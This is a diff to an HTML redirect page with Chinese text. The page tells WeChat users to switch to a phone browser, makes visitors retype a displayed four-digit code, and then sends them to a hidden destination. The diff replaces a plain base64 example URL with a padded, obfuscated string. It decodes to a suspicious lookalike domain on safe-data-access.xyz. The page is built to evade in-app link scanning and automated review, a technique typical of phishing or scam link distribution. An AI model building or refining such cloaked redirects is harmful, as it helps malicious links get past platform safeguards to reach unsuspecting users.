@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>访问验证</title>
+  <title>正在加载</title>
   <style>
     body {
       margin: 0;
@@ -55,12 +55,12 @@
 <body>
   <div id="wechat-warning" class="hidden">
     <div class="lock-icon">🔒</div>
-    <div class="message">请使用手机自带浏览器打开此页面</div>
+    <div class="message">请使用手机浏览器打开此页面</div>
   </div>
 
   <div id="verify-box" class="hidden">
     <div class="lock-icon">🔒</div>
-    <div class="message">请输入下方验证码以继续访问</div>
+    <div class="message">请输入下方验证码继续</div>
     <div class="code-display" id="show-code">----</div>
     <input type="text" id="code-input" maxlength="4" placeholder="验证码">
     <br>
@@ -74,14 +74,26 @@
     }
 
     const generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
-    const encodedUrl = "aHR0cHM6Ly9leGFtcGxlLmNvbS9maW5hbC1kZXN0aW5hdGlvbg==";
+    const encodedLink = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA=="; // 示例加密
+    const prefixLength = 5;
+    const suffixLength = 4;
+
+    function decodeUrl(encoded) {
+      try {
+        const decoded = atob(encoded);
+        return decoded.slice(prefixLength, -suffixLength);
+      } catch {
+        return null;
+      }
+    }
 
     function checkCode() {
       const input = document.getElementById("code-input").value.trim();
       if (input === generatedCode) {
         document.getElementById("error").innerText = "";
-        const decodedUrl = atob(encodedUrl);
-        window.location.href = decodedUrl;
+        const realUrl = decodeUrl(encodedLink);
+        if (realUrl) window.location.href = realUrl;
+        else document.getElementById("error").innerText = "加载失败，链接损坏";
       } else {
         document.getElementById("error").innerText = "验证码错误，请重试";
       }
